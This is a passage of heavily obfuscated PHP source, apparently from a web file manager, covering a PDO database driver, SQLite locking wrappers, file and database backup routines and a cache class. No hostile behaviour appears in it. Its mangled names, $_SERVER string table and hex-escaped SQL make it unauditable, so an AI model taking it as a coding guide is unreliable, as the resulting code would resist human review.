$this->_linkID->prepare($ËÉŞ²®õ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $²µ¥¬ = $this->PDOStatement->execute($¨ÎÊ¥è); $this->debug(); if (!1 === $²µ¥¬) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¬Œ¶èäº, $ô·ò˜¼‡ = array()) { $Å¢™ÕœÒ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¬Œ¶èäº; if (!empty($ô·ò˜¼‡)) { $this->queryStr .= $Å¢™ÕœÒ[970] . print_r($ô·ò˜¼‡, !0) . $Å¢™ÕœÒ[971]; } $Ôî£˜Äú = !1; if ($this->dbType == $Å¢™ÕœÒ[964]) { if (preg_match($Å¢™ÕœÒ[972], $this->queryStr, $“á¢áÏİ)) { $this->table = think_config($Å¢™ÕœÒ[973]) . str_ireplace(think_config($Å¢™ÕœÒ[974]), $Å¢™ÕœÒ[422], $“á¢áÏİ[2]); $Ôî£˜Äú = (bool) $this->query($Å¢™ÕœÒ[975] . strtoupper($this->table) . $Å¢™ÕœÒ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Å¢™ÕœÒ[25], 1); think_status($Å¢™ÕœÒ[24]); $this->PDOStatement = $this->_linkID->prepare($¬Œ¶èäº); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Òş—º‡ = $this->PDOStatement->execute($ô·ò˜¼‡); $this->debug(); if (!1 === $Òş—º‡) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ôî£˜Äú || preg_match($Å¢™ÕœÒ[976], $¬Œ¶èäº)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÀˆÓıå© = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÀˆÓıå©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢„½åÂ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¢„½åÂ) { $this->error(); return !1; } } return !0; } private function getAll() { $úîü³óœ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($úîü³óœ); return $úîü³óœ; } public function getFields($´êÆîœ×) { $ŠÔÜ–‹¹ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!0); if (think_config($ŠÔÜ–‹¹[977])) { $ÂÆ×óî¡ = str_replace($ŠÔÜ–‹¹[978], $´êÆîœ×, think_config($ŠÔÜ–‹¹[977])); } else { switch ($this->dbType) { case $ŠÔÜ–‹¹[961]: case $ŠÔÜ–‹¹[979]: $ÂÆ×óî¡ = "\123\105\x4c\105\103\x54\40\x20\40\143\x6f\x6c\165\x6d\x6e\x5f\156\141\155\145\40\x61\x73\40\x27\x4e\141\x6d\x65\47\x2c\40\x20\40\144\141\164\x61\x5f\x74\x79\160\x65\x20\141\163\x20\47\124\171\160\x65\47\54\40\x20\40\x63\x6f\154\x75\x6d\156\x5f\x64\x65\146\x61\x75\x6c\x74\x20\141\163\x20\x27\x44\x65\146\141\x75\x6c\x74\x27\x2c\x20\40\x20\x69\163\137\x6e\x75\154\154\141\142\154\145\40\141\163\40\x27\116\x75\x6c\154\47\xa\x9\11\106\x52\x4f\115\x9\x69\x6e\146\x6f\x72\x6d\141\x74\x69\157\156\137\x73\143\x68\x65\155\141\56\x74\x61\x62\154\145\163\40\101\x53\40\164\xa\x9\x9\112\x4f\111\x4e\11\151\x6e\146\x6f\162\155\141\x74\151\157\x6e\x5f\163\x63\150\x65\x6d\x61\56\x63\157\154\x75\x6d\156\163\x20\x41\123\40\x63\xa\11\11\x4f\x4e\40\40\164\56\x74\x61\x62\x6c\x65\137\x63\141\164\141\x6c\x6f\147\x20\x3d\x20\143\x2e\164\x61\x62\x6c\x65\137\x63\141\x74\x61\x6c\x6f\147\xa\11\11\x41\116\104\x20\164\56\x74\x61\x62\154\x65\x5f\163\143\150\x65\x6d\x61\x20\75\40\143\x2e\164\141\142\x6c\x65\137\163\143\150\x65\x6d\141\xa\11\x9\101\x4e\104\40\x74\56\x74\x61\x62\x6c\x65\137\x6e\x61\x6d\x65\40\x3d\x20\x63\56\164\141\x62\154\x65\x5f\x6e\x61\155\145\12\11\x9\x57\x48\x45\122\105\40\40\x20\164\56\x74\141\142\x6c\145\137\156\x61\155\145\x20\x3d\x20\47{$´êÆîœ×}\47"; break; case $ŠÔÜ–‹¹[980]: $ÂÆ×óî¡ = $ŠÔÜ–‹¹[981] . $´êÆîœ× . $ŠÔÜ–‹¹[982]; break; case $ŠÔÜ–‹¹[962]: case $ŠÔÜ–‹¹[964]: $ÂÆ×óî¡ = $ŠÔÜ–‹¹[983] . $ŠÔÜ–‹¹[984] . $ŠÔÜ–‹¹[985] . strtoupper($´êÆîœ×) . $ŠÔÜ–‹¹[986] . strtoupper($´êÆîœ×) . $ŠÔÜ–‹¹[987]; break; case $ŠÔÜ–‹¹[988]: $ÂÆ×óî¡ = $ŠÔÜ–‹¹[989] . $´êÆîœ× . $ŠÔÜ–‹¹[990]; break; case $ŠÔÜ–‹¹[963]: break; case $ŠÔÜ–‹¹[991]: default: $ÂÆ×óî¡ = $ŠÔÜ–‹¹[992] . ($this->dbType == $ŠÔÜ–‹¹[991] ? "\140{$´êÆîœ×}\140" : $´êÆîœ×); } } $ğŒõ¥öí = $this->query($ÂÆ×óî¡); $³ÌÑæª× = array(); if ($ğŒõ¥öí) { foreach ($ğŒõ¥öí as $ƒ½Â·°ƒ => $‹¼›Øö) { $‹¼›Øö = array_change_key_case($‹¼›Øö); $‹¼›Øö[$ŠÔÜ–‹¹[32]] = isset($‹¼›Øö[$ŠÔÜ–‹¹[32]]) ? $‹¼›Øö[$ŠÔÜ–‹¹[32]] : $ŠÔÜ–‹¹[422]; $‹¼›Øö[$ŠÔÜ–‹¹[33]] = isset($‹¼›Øö[$ŠÔÜ–‹¹[33]]) ? $‹¼›Øö[$ŠÔÜ–‹¹[33]] : $ŠÔÜ–‹¹[422]; $¢¥ñœê = isset($‹¼›Øö[$ŠÔÜ–‹¹[317]]) ? $‹¼›Øö[$ŠÔÜ–‹¹[317]] : $‹¼›Øö[$ŠÔÜ–‹¹[32]]; $³ÌÑæª×[$¢¥ñœê] = array($ŠÔÜ–‹¹[32] => $¢¥ñœê, $ŠÔÜ–‹¹[33] => $‹¼›Øö[$ŠÔÜ–‹¹[33]], $ŠÔÜ–‹¹[35] => (bool) (isset($‹¼›Øö[$ŠÔÜ–‹¹[103]]) && $‹¼›Øö[$ŠÔÜ–‹¹[103]] === $ŠÔÜ–‹¹[12] || isset($‹¼›Øö[$ŠÔÜ–‹¹[35]]) && $‹¼›Øö[$ŠÔÜ–‹¹[35]] === $ŠÔÜ–‹¹[12]), $ŠÔÜ–‹¹[37] => isset($‹¼›Øö[$ŠÔÜ–‹¹[37]]) ? $‹¼›Øö[$ŠÔÜ–‹¹[37]] : (isset($‹¼›Øö[$ŠÔÜ–‹¹[56]]) ? $‹¼›Øö[$ŠÔÜ–‹¹[56]] : $ŠÔÜ–‹¹[422]), $ŠÔÜ–‹¹[39] => isset($‹¼›Øö[$ŠÔÜ–‹¹[94]]) ? strtolower($‹¼›Øö[$ŠÔÜ–‹¹[94]]) == $ŠÔÜ–‹¹[41] : (isset($‹¼›Øö[$ŠÔÜ–‹¹[57]]) ? $‹¼›Øö[$ŠÔÜ–‹¹[57]] : !1), $ŠÔÜ–‹¹[42] => isset($‹¼›Øö[$ŠÔÜ–‹¹[993]]) ? strtolower($‹¼›Øö[$ŠÔÜ–‹¹[993]]) == $ŠÔÜ–‹¹[44] : (isset($‹¼›Øö[$ŠÔÜ–‹¹[94]]) ? $‹¼›Øö[$ŠÔÜ–‹¹[94]] : !1)); } } return $³ÌÑæª×; } public function getTables($…ø‹ôß = '') { $¹„¦Âß¢ =& $_SERVER[—ÌÒğš÷]; if (think_config($¹„¦Âß¢[994])) { $àîç±÷² = str_replace($¹„¦Âß¢[995], $…ø‹ôß, think_config($¹„¦Âß¢[994])); } else { switch ($this->dbType) { case $¹„¦Âß¢[962]: case $¹„¦Âß¢[964]: $àîç±÷² = $¹„¦Âß¢[996]; break; case $¹„¦Âß¢[961]: case $¹„¦Âß¢[979]: $àîç±÷² = $¹„¦Âß¢[997]; break; case $¹„¦Âß¢[988]: $àîç±÷² = $¹„¦Âß¢[998]; break; case $¹„¦Âß¢[963]: think_exception(think_lang($¹„¦Âß¢[999]) . $¹„¦Âß¢[1000]); break; case $¹„¦Âß¢[980]: $àîç±÷² = $¹„¦Âß¢[45] . $¹„¦Âß¢[46] . $¹„¦Âß¢[47]; break; case $¹„¦Âß¢[991]: default: if (!empty($…ø‹ôß)) { $àîç±÷² = $¹„¦Âß¢[943] . $…ø‹ôß . $¹„¦Âß¢[944]; } else { $àîç±÷² = $¹„¦Âß¢[945]; } } } $¸§ÓªÍ€ = $this->query($àîç±÷²); $ÊèïÙóØ = array(); foreach ($¸§ÓªÍ€ as $ÙöŒà“¶ => $¼ĞÙ± ) { $ÊèïÙóØ[$ÙöŒà“¶] = current($¼ĞÙ± ); } return $ÊèïÙóØ; } protected function parseLimit($øí›Çëğ) { $Í«ÁÉşğ =& $_SERVER[—ÌÒğš÷]; $…¦Ü¥Úú = $Í«ÁÉşğ[12]; if (!empty($øí›Çëğ)) { switch ($this->dbType) { case $Í«ÁÉşğ[988]: case $Í«ÁÉşğ[980]: $øí›Çëğ = explode($Í«ÁÉşğ[50], $øí›Çëğ); if (count($øí›Çëğ) > 1) { $…¦Ü¥Úú .= $Í«ÁÉşğ[51] . $øí›Çëğ[1] . $Í«ÁÉşğ[52] . $øí›Çëğ[0] . $Í«ÁÉşğ[53]; } else { $…¦Ü¥Úú .= $Í«ÁÉşğ[51] . $øí›Çëğ[0] . $Í«ÁÉşğ[53]; } break; case $Í«ÁÉşğ[961]: case $Í«ÁÉşğ[979]: break; case $Í«ÁÉşğ[963]: break; case $Í«ÁÉşğ[962]: case $Í«ÁÉşğ[964]: break; case $Í«ÁÉşğ[991]: default: $…¦Ü¥Úú .= $Í«ÁÉşğ[51] . $øí›Çëğ . $Í«ÁÉşğ[53]; } } return $…¦Ü¥Úú; } public function parseKey(&$ûÌÎŞãª, $Õğ°“î = true) { $ñ£àª­¸ =& $_SERVER[—ÌÒğš÷]; if ($Õğ°“î) { $ûÌÎŞãª = $this->parseKeyCheck($ûÌÎŞãª); } if ($this->dbType == $ñ£àª­¸[991]) { if ($ûÌÎŞãª != $ñ£àª­¸[203] && !preg_match($ñ£àª­¸[955], $ûÌÎŞãª)) { $ûÌÎŞãª = $ñ£àª­¸[429] . trim($ûÌÎŞãª, $ñ£àª­¸[429]) . $ñ£àª­¸[429]; } return $ûÌÎŞãª; } else { return parent::parseKey($ûÌÎŞãª, $Õğ°“î); } } public function close() { $this->_linkID = null; } public function error() { $ãµåçÏ“ =& $_SERVER[—ÌÒğš÷]; if ($this->PDOStatement) { $ªô£ĞÀ = $this->PDOStatement->errorInfo(); $this->error = $ªô£ĞÀ[1] . $ãµåçÏ“[4] . $ªô£ĞÀ[2]; } else { $this->error = $ãµåçÏ“[12]; } if ($ãµåçÏ“[12] != $this->queryStr) { $this->error .= LNG($ãµåçÏ“[48]) . $this->queryStr; } think_trace($this->error, $ãµåçÏ“[12], $ãµåçÏ“[49]); return $this->error; } public function escapeString($Á“Åò›½) { $©İƒ¾™ =& $_SERVER[—ÌÒğš÷]; switch ($this->dbType) { case $©İƒ¾™[988]: case $©İƒ¾™[961]: case $©İƒ¾™[979]: case $©İƒ¾™[991]: return addslashes($Á“Åò›½); case $©İƒ¾™[963]: case $©İƒ¾™[980]: case $©İƒ¾™[962]: case $©İƒ¾™[964]: return str_ireplace($©İƒ¾™[58], $©İƒ¾™[59], $Á“Åò›½); } } protected function parseValue($İ¾ËıŒŒ) { $¥—Œ™¬õ =& $_SERVER[—ÌÒğš÷]; if (is_string($İ¾ËıŒŒ)) { $µ‡Ÿ¸• = strpos($İ¾ËıŒŒ, $¥—Œ™¬õ[4]) === 0 && in_array($İ¾ËıŒŒ, array_keys($this->bind)); $İ¾ËıŒŒ = $µ‡Ÿ¸• ? $this->escapeString($İ¾ËıŒŒ) : $¥—Œ™¬õ[1001] . $this->escapeString($İ¾ËıŒŒ) . $¥—Œ™¬õ[1001]; } elseif (isset($İ¾ËıŒŒ[0]) && is_string($İ¾ËıŒŒ[0]) && strtolower($İ¾ËıŒŒ[0]) == $¥—Œ™¬õ[341]) { $İ¾ËıŒŒ = $this->escapeString($İ¾ËıŒŒ[1]); } elseif (is_array($İ¾ËıŒŒ)) { $İ¾ËıŒŒ = array_map(array($this, $¥—Œ™¬õ[1002]), $İ¾ËıŒŒ); } elseif (is_bool($İ¾ËıŒŒ)) { $İ¾ËıŒŒ = $İ¾ËıŒŒ ? $¥—Œ™¬õ[88] : $¥—Œ™¬õ[212]; } elseif (is_null($İ¾ËıŒŒ)) { $İ¾ËıŒŒ = $¥—Œ™¬õ[103]; } return $İ¾ËıŒŒ; } public function getLastInsertId() { $›øŠ¤“É =& $_SERVER[—ÌÒğš÷]; switch ($this->dbType) { case $›øŠ¤“É[988]: case $›øŠ¤“É[980]: case $›øŠ¤“É[961]: case $›øŠ¤“É[979]: case $›øŠ¤“É[963]: case $›øŠ¤“É[991]: return $this->_linkID->lastInsertId(); case $›øŠ¤“É[962]: case $›øŠ¤“É[964]: $œ€ïÒÍ„ = $this->table; $ĞÊœóËª = $this->query("\x53\105\114\x45\103\124\x20{$œ€ïÒÍ„}\x2e\143\x75\162\162\166\141\x6c\40\x63\x75\162\x72\x76\141\154\40\106\122\x4f\115\x20\x64\165\x61\154"); return $ĞÊœóËª ? $ĞÊœóËª[0][$›øŠ¤“É[1003]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($úµ„Õ»«) { $ó®Ü”Ê„ =& $_SERVER[—ÌÒğš÷]; if (!CacheLock::fileLock($ó®Ü”Ê„[13])) { return !1; } $ˆäÅ£Ï° = parent::query($úµ„Õ»«); CacheLock::fileUnLock($ó®Ü”Ê„[13]); return $ˆäÅ£Ï°; } public function execute($¢‚óôÎ) { $Û§¾Û¢ˆ =& $_SERVER[—ÌÒğš÷]; if (!CacheLock::fileLock($Û§¾Û¢ˆ[13])) { return !1; } $”åƒ¢¶ = parent::execute($¢‚óôÎ); CacheLock::fileUnLock($Û§¾Û¢ˆ[13]); return $”åƒ¢¶; } } class DbSqlite3 extends DbSqlite3Base { public function query($Ò¿ñ³×¾) { $µÈÁÏ… =& $_SERVER[—ÌÒğš÷]; if (!CacheLock::fileLock($µÈÁÏ…[13])) { return !1; } $æ´õÖí = parent::query($Ò¿ñ³×¾); CacheLock::fileUnLock($µÈÁÏ…[13]); return $æ´õÖí; } public function execute($©ğÎÓõú) { $Ñ˜‡ƒÔØ =& $_SERVER[—ÌÒğš÷]; if (!CacheLock::fileLock($Ñ˜‡ƒÔØ[13])) { return !1; } $şØ­ÊŞò = parent::execute($©ğÎÓõú); CacheLock::fileUnLock($Ñ˜‡ƒÔØ[13]); return $şØ­ÊŞò; } } goto D´õÁ­¢ßå; eå…°ëË·: class BackupDbFile { public function __construct() { } public function index() { $‚äÛ†´Î =& $_SERVER[—ÌÒğš÷]; $ƒäéôËî = Backup::get(); $¡ü„«¦¢ = $ƒäéôËî[$‚äÛ†´Î[32]]; $®œˆ£„ = $this->tmpFilesPath() . "\x62\141\143\x6b\165\x70\137{$¡ü„«¦¢}\x2f"; $Éşì„û˜ = $this->backupPath($ƒäéôËî); if (!($Éşì„û˜ = IO::mkdir($Éşì„û˜))) { return !1; } $•®ëùÛú = IO::listPath($®œˆ£„); $‹â½ÍÏ£ = isset($•®ëùÛú[$‚äÛ†´Î[83]]) ? $•®ëùÛú[$‚äÛ†´Î[83]] : array(); $ƒ‡é¹£ñ = array_sum(array_column($‹â½ÍÏ£, $‚äÛ†´Î[76])); if (!$ƒ‡é¹£ñ) { return !1; } $Ïû×ŸŒ = array($‚äÛ†´Î[834] => $ƒ‡é¹£ñ, $‚äÛ†´Î[835] => time()); Backup::set($Ïû×ŸŒ); $«áñù¨ı = new TaskFileTransfer($‚äÛ†´Î[836], $‚äÛ†´Î[816], count($‹â½ÍÏ£), LNG($‚äÛ†´Î[817]) . $‚äÛ†´Î[430] . LNG($‚äÛ†´Î[819]) . $‚äÛ†´Î[837]); $«áñù¨ı->task[$‚äÛ†´Î[799]] = $ƒ‡é¹£ñ; foreach ($•®ëùÛú[$‚äÛ†´Î[83]] as $åõÚĞòõ) { $âØ’¦‡ = IO::move($åõÚĞòõ[$‚äÛ†´Î[84]], $Éşì„û˜); if (!$âØ’¦‡) { $«áñù¨ı->end(); $ËŒ™·ğû = IO::getLastError($‚äÛ†´Î[838] . $åõÚĞòõ[$‚äÛ†´Î[84]] . $‚äÛ†´Î[839] . $Éşì„û˜ . $‚äÛ†´Î[165]); write_log($ËŒ™·ğû, $‚äÛ†´Î[816]); return !1; } } $¾–­ßü = new DbManage(); $—Š°ğ× = $¾–­ßü->getSqlFile(); if (!$—Š°ğ×[$‚äÛ†´Î[840]] || !$—Š°ğ×[$‚äÛ†´Î[13]]) { return !1; } IO::move($—Š°ğ×[$‚äÛ†´Î[840]], $Éşì„û˜); IO::move($—Š°ğ×[$‚äÛ†´Î[13]], $Éşì„û˜); $«áñù¨ı->end(); $Ïû×ŸŒ = array($‚äÛ†´Î[841] => $ƒ‡é¹£ñ, $‚äÛ†´Î[842] => time()); Backup::set($Ïû×ŸŒ); return !0; } private function backupPath($Üº·ÜÆ—) { $…Á«ô =& $_SERVER[—ÌÒğš÷]; $î¹ÆÛåá = $Üº·ÜÆ—[$…Á«ô[32]]; $—÷£ÅÊ´ = Model($…Á«ô[806])->get($…Á«ô[807]); $ş­éÃÒ¹ = substr(md5($…Á«ô[808] . $—÷£ÅÊ´ . $î¹ÆÛåá), 0, 8); return "\x7b\x69\157\x3a{$Üº·ÜÆ—[$…Á«ô[787]]}\x7d\57\144\x61\x74\141\x62\141\163\145\57\x62\x61\x63\x6b\165\160\x2f" . $î¹ÆÛåá . $…Á«ô[11] . $ş­éÃÒ¹; } private function tmpFilesPath() { $Ü°¹Ö¦ =& $_SERVER[—ÌÒğš÷]; $ÖƒğËËŞ = TEMP_FILES; if ($GLOBALS[$Ü°¹Ö¦[6]][$Ü°¹Ö¦[89]][$Ü°¹Ö¦[832]]) { $ÖƒğËËŞ = $GLOBALS[$Ü°¹Ö¦[6]][$Ü°¹Ö¦[89]][$Ü°¹Ö¦[832]]; if (!mk_dir($ÖƒğËËŞ) || !is_writable($ÖƒğËËŞ) || !IO::mkfile($ÖƒğËËŞ . $Ü°¹Ö¦[833])) { $ÖƒğËËŞ = TEMP_FILES; } } return $ÖƒğËËŞ; } } class BackupFile { public function __construct() { } public function index() { $ä–ö¯õÔ = Backup::get(); $©ˆ¸” = $ä–ö¯õÔ[$_SERVER[—ÌÒğš÷][337]][$_SERVER[—ÌÒğš÷][214]][$_SERVER[—ÌÒğš÷][509]]; $İÏş‡“Ô = array($_SERVER[—ÌÒğš÷][510] => array($_SERVER[—ÌÒğš÷][843], $©ˆ¸”), $_SERVER[—ÌÒğš÷][844] => array($_SERVER[—ÌÒğš÷][375], $ä–ö¯õÔ[$_SERVER[—ÌÒğš÷][787]])); $ã£¡»± = (int) Model($_SERVER[—ÌÒğš÷][825])->where($İÏş‡“Ô)->count($_SERVER[—ÌÒğš÷][509]); $å¾êÊøŸ = (int) Model($_SERVER[—ÌÒğš÷][825])->where($İÏş‡“Ô)->sum($_SERVER[—ÌÒğš÷][76]); $ˆÜöµîµ = new TaskFileTransfer($_SERVER[—ÌÒğš÷][845], $_SERVER[—ÌÒğš÷][816], $ã£¡»±, LNG($_SERVER[—ÌÒğš÷][817]) . $_SERVER[—ÌÒğš÷][818] . LNG($_SERVER[—ÌÒğš÷][846])); $ˆÜöµîµ->task[$_SERVER[—ÌÒğš÷][799]] = $å¾êÊøŸ; $û½ªˆ˜† = array($_SERVER[—ÌÒğš÷][847] => $ã£¡»±, $_SERVER[—ÌÒğš÷][848] => $å¾êÊøŸ, $_SERVER[—ÌÒğš÷][849] => time()); Backup::set($û½ªˆ˜†); $û¯–İª = !0; $¦çƒ¸ûò = $this->storeIds(); $ûâ©ßÖØ = 1; $ÙÙ¢ªî = 1000; $‚ÛùıÅ¾ = $àâ’æƒ£ = 0; $…ûÙâà• = array(); $è• †œ = $ò¹½ù¡à = 0; do { $—Ä¸Ş·š = $_SERVER[—ÌÒğš÷][850]; $‡ıà–Ã˜ = Model($_SERVER[—ÌÒğš÷][825])->where($İÏş‡“Ô)->field($—Ä¸Ş·š)->order($_SERVER[—ÌÒğš÷][851])->selectPage($ÙÙ¢ªî, $ûâ©ßÖØ); $Ú±Œ¨¸º = !empty($‡ıà–Ã˜[$_SERVER[—ÌÒğš÷][413]]) ? $‡ıà–Ã˜[$_SERVER[—ÌÒğš÷][413]] : array(); foreach ($Ú±Œ¨¸º as $´Ç·¼È‚) { if (!$this->_fileExist($´Ç·¼È‚, $…ûÙâà•, $¦çƒ¸ûò)) { $ã£¡»± -= 1; $å¾êÊøŸ -= (int) $´Ç·¼È‚[$_SERVER[—ÌÒğš÷][76]]; write_log("\146\x69\154\145\40\x6e\157\x74\x20\x65\170\x69\163\x74\56\146\x69\x6c\145\111\x44\72{$´Ç·¼È‚[$_SERVER[—ÌÒğš÷][509]]}\x2c\40\x70\x61\164\x68\72{$´Ç·¼È‚[$_SERVER[—ÌÒğš÷][84]]}", $_SERVER[—ÌÒğš÷][852]); continue; } $úÛ‡«ğş = $´Ç·¼È‚[$_SERVER[—ÌÒğš÷][84]]; $¥³ß…š‰ = "\x7b\x69\x6f\72{$ä–ö¯õÔ[$_SERVER[—ÌÒğš÷][787]]}\x7d" . substr($úÛ‡«ğş, strlen("\173\151\x6f\72{$´Ç·¼È‚[$_SERVER[—ÌÒğš÷][853]]}\175")); if (IO::exist($¥³ß…š‰)) { $ˆÜöµîµ->updateFileEnd($´Ç·¼È‚[$_SERVER[—ÌÒğš÷][32]], $´Ç·¼È‚[$_SERVER[—ÌÒğš÷][76]]); } else { $¥³ß…š‰ = get_path_father($¥³ß…š‰); IO::mkdir($¥³ß…š‰); if (!IO::copy($úÛ‡«ğş, $¥³ß…š‰, $_SERVER[—ÌÒğš÷][854])) { write_log($_SERVER[—ÌÒğš÷][855] . $úÛ‡«ğş . $_SERVER[—ÌÒğš÷][839] . $¥³ß…š‰ . $_SERVER[—ÌÒğš÷][165], $_SERVER[—ÌÒğš÷][816]); $û¯–İª = !1; break; } } $©ˆ¸” = $´Ç·¼È‚[$_SERVER[—ÌÒğš÷][509]]; $àâ’æƒ£ += 1; $‚ÛùıÅ¾ += $´Ç·¼È‚[$_SERVER[—ÌÒğš÷][76]]; $ò¹½ù¡à += 1; $è• †œ += $´Ç·¼È‚[$_SERVER[—ÌÒğš÷][76]]; if ($‚ÛùıÅ¾ >= 1024 * 1024 * 100) { $û½ªˆ˜† = array($_SERVER[—ÌÒğš÷][856] => $©ˆ¸”, $_SERVER[—ÌÒğš÷][857] => $ò¹½ù¡à, $_SERVER[—ÌÒğš÷][858] => $è• †œ); Backup::set($û½ªˆ˜†); $‚ÛùıÅ¾ = $àâ’æƒ£ = 0; } } $ìÆšªƒ© = count($Ú±Œ¨¸º); $ûâ©ßÖØ++; } while ($ìÆšªƒ© == $ÙÙ¢ªî); $ˆÜöµîµ->end(); $û½ªˆ˜† = array($_SERVER[—ÌÒğš÷][859] => 1, $_SERVER[—ÌÒğš÷][797] => time(), $_SERVER[—ÌÒğš÷][811] => 1, $_SERVER[—ÌÒğš÷][856] => $©ˆ¸”, $_SERVER[—ÌÒğš÷][848] => $å¾êÊøŸ, $_SERVER[—ÌÒğš÷][847] => $ã£¡»±, $_SERVER[—ÌÒğš÷][860] => time()); if ($àâ’æƒ£) { $û½ªˆ˜†[$_SERVER[—ÌÒğš÷][857]] = $ò¹½ù¡à; $û½ªˆ˜†[$_SERVER[—ÌÒğš÷][858]] = $è• †œ; } Backup::set($û½ªˆ˜†); $this->_fileFilter($…ûÙâà•); return !0; } private function _fileExist($Òê£“ê, &$¡‡ˆ¼¢£, $»êÌ®ÊÎ) { $ø³à…•Ò =& $_SERVER[—ÌÒğš÷]; $ÙŒ™¿äò = $Òê£“ê[$ø³à…•Ò[84]]; if (in_array($Òê£“ê[$ø³à…•Ò[509]], $¡‡ˆ¼¢£)) { return !1; } if (!in_array($Òê£“ê[$ø³à…•Ò[853]], $»êÌ®ÊÎ)) { return !1; } if (IO::exist($ÙŒ™¿äò)) { return !0; } $µñÓí• = get_path_father($ÙŒ™¿äò); if (IO::exist($µñÓí•)) { $¡‡ˆ¼¢£[] = $Òê£“ê[$ø³à…•Ò[509]]; return !1; } $˜òÊ–Ç– = array($ø³à…•Ò[853] => $Òê£“ê[$ø³à…•Ò[853]], $ø³à…•Ò[84] => array($ø³à…•Ò[427], "{$µñÓí•}\45")); $‰Õûé¨ô = Model($ø³à…•Ò[825])->where($˜òÊ–Ç–)->field($ø³à…•Ò[510])->select(); $¡‡ˆ¼¢£ = array_merge($¡‡ˆ¼¢£, array_to_keyvalue($‰Õûé¨ô, $ø³à…•Ò[12], $ø³à…•Ò[509])); return !1; } private function _fileFilter($‡ÙÄŠ¾Ó) { $òš¥¤±š =& $_SERVER[—ÌÒğš÷]; if (empty($‡ÙÄŠ¾Ó)) { return; } $º”˜ø§Ã = array($òš¥¤±š[509] => array($òš¥¤±š[7], array_unique($‡ÙÄŠ¾Ó))); $ÍÊ½’ê = Model($òš¥¤±š[861])->where($º”˜ø§Ã)->field($òš¥¤±š[181])->select(); foreach ($ÍÊ½’ê as $…üÏ€¶‰) { Model($òš¥¤±š[861])->remove($…üÏ€¶‰[$òš¥¤±š[181]], !1); } } private function storeIds() { $µïª¹Ï‹ =& $_SERVER[—ÌÒğš÷]; $ã„Œ‘ Â = Model($µïª¹Ï‹[803])->listData(); $Ø´îÅ•í = array(); $Øüı÷Î¹ = $GLOBALS[$µïª¹Ï‹[6]][$µïª¹Ï‹[89]][$µïª¹Ï‹[862]]; foreach ($ã„Œ‘ Â as $Ÿ°’î×÷) { $ÊŠß¡ïÈ = strtolower($Ÿ°’î×÷[$µïª¹Ï‹[95]]); if (!isset($Øüı÷Î¹[$ÊŠß¡ïÈ])) { continue; } $»¨®ª÷” = $µïª¹Ï‹[74] . (isset($Øüı÷Î¹[$ÊŠß¡ïÈ]) ? $Øüı÷Î¹[$ÊŠß¡ïÈ] : ucfirst($ÊŠß¡ïÈ)); if (!class_exists($»¨®ª÷”)) { continue; } $Ø´îÅ•í[] = $Ÿ°’î×÷[$µïª¹Ï‹[443]]; } return $Ø´îÅ•í; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ö§ÖÎÉÈ =& $_SERVER[—ÌÒğš÷]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $•ôù¢ë· = $GLOBALS[$ö§ÖÎÉÈ[6]][$ö§ÖÎÉÈ[393]]; $ÉŒ‡¦‹¡ = $•ôù¢ë·[$•ôù¢ë·[$ö§ÖÎÉÈ[863]]]; $Æè‘‚¦î = $•ôù¢ë·[$ö§ÖÎÉÈ[864]]; switch ($•ôù¢ë·[$ö§ÖÎÉÈ[863]]) { case $ö§ÖÎÉÈ[21]: self::$handle = Model($ö§ÖÎÉÈ[865]); break; case $ö§ÖÎÉÈ[866]: self::$handle = new CacheRedis($ÉŒ‡¦‹¡, $Æè‘‚¦î); break; case $ö§ÖÎÉÈ[867]: self::$handle = new CacheMemcached($ÉŒ‡¦‹¡, $Æè‘‚¦î); break; case $ö§ÖÎÉÈ[214]: self::$handle = new CacheFile($ÉŒ‡¦‹¡, $Æè‘‚¦î); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($†ƒ«ğ¾Á) { if (is_array($†ƒ«ğ¾Á) || is_object($†ƒ«ğ¾Á)) { $†ƒ«ğ¾Á = json_encode($†ƒ«ğ¾Á); } $†ƒ«ğ¾Á = rawurlencode($†ƒ«ğ¾Á); return md5(KOD_SITE_ID . $_SERVER[—ÌÒğš÷][11] . $†ƒ«ğ¾Á); } public static function get($ÀÙ«å ™, $ÄóŒÌİÇ = false) { $õ«Èâù‰ = self::key($ÀÙ«å ™); $õ¯·’ï = self::init(); if ($ÄóŒÌİÇ) { return unserialize($õ¯·’ï->get($õ«Èâù‰)); } if (!isset(self::$memoryCache[$õ«Èâù‰])) { $è±­½Äİ = $õ¯·’ï->get($õ«Èâù‰); self::$memoryCache[$õ«Èâù‰] = unserialize($è±­½Äİ); } return self::$memoryCache[$õ«Èâù‰]; } public static function set($Ñè•ô§›, $ôÊ‰¹é¢, $­ŞÕ½¢ = false) { $ª¨œñ†Í =& $_SERVER[—ÌÒğš÷]; $°åé‡®Í = self::key($Ñè•ô§›); if (isset(self::$memoryCache[$°åé‡®Í]) && self::$memoryCache[$°åé‡®Í] === $ôÊ‰¹é¢) { return !0; } if ($­ŞÕ½¢ === 0) { self::$memoryCache[$°åé‡®Í] = $ôÊ‰¹é¢; return !0; } $¤õ¶ÃÕÁ = self::init(); $¦»Á…ĞÇ = serialize($ôÊ‰¹é¢); CacheLock::lock($Ñè•ô§› . $ª¨œñ†Í[868]); $ò£Ç–óã = $¤õ¶ÃÕÁ->set($°åé‡®Í, $¦»Á…ĞÇ, $­ŞÕ½¢); self::$memoryCache[$°åé‡®Í] = $ôÊ‰¹é¢; CacheLock::unlock($Ñè•ô§› . 